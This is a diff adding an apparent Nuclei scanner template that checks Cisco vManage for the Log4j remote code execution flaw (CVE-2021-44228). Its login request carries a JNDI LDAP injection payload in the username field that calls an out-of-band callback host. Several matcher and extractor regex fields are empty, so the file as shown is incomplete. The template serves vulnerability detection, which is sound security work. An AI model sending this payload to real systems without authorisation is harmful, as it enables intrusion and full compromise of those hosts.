@@ -1,0 +1,69 @@
+id: cisco-vmanage-log4j
+
+info:
+  name: Cisco vManage (Log4j) - Remote Code Execution
+  author: DhiyaneshDK
+  severity: critical
+  description: Cisco vManage is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. More information is available in the cisco-sa-apache-log4j-qRuKNEbd advisory.
+  reference:
+    - https://www.tenable.com/plugins/nessus/161212
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"vManage"
+  tags: log4j,cisco,tenable,cve,cve2021,rce,jndi,kev,oast
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        POST /j_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}
+
+        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=admin&submit=Log+In
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - '<title>Cisco vManage</title>'
+
+      - type: regex
+        part: interactsh_request
+        regex:
+
+
+    extractors:
+      - type: kval
+        kval:
+
+
+      - type: regex
+        group: 2
+        regex:
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+        part: interactsh_request
+# digest: 4a0a00473045022100de2072fc8e1ba56a42f92db188c6d186d310b8f871bd9fc9f08d9ecc6823915802205443a8c561bb1ad6c96387f52d1b13daa122e2d3fa0c7883a2fefaf8a69620aa:922c64590222798bb761d5b6d8e72950
